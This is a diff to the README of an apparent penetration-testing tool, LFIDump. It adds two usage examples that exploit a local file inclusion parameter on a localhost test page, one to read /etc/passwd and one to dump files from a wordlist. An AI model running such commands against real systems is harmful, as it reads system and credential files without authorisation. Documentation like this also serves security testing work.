@@ -36,6 +36,18 @@ optional arguments:
   -k, --insecure        Allow insecure server connections when using SSL (default: False)
 ```
 
+## Examples
+
+ + Dump a single file
+    ```
+    ./LFIDump.py -u "http://localhost:8000/lfi.php?page=LFIPATH" -f /etc/passwd
+    ```
+   
+ + Dump files from a wordlist
+    ```
+    ./LFIDump.py -u "http://localhost:8000/lfi.php?page=LFIPATH" -F ./wordlists/all.txt
+    ```
+
 ## Contributing
 
 Pull requests are welcome. Feel free to open an issue if you want to add other features.
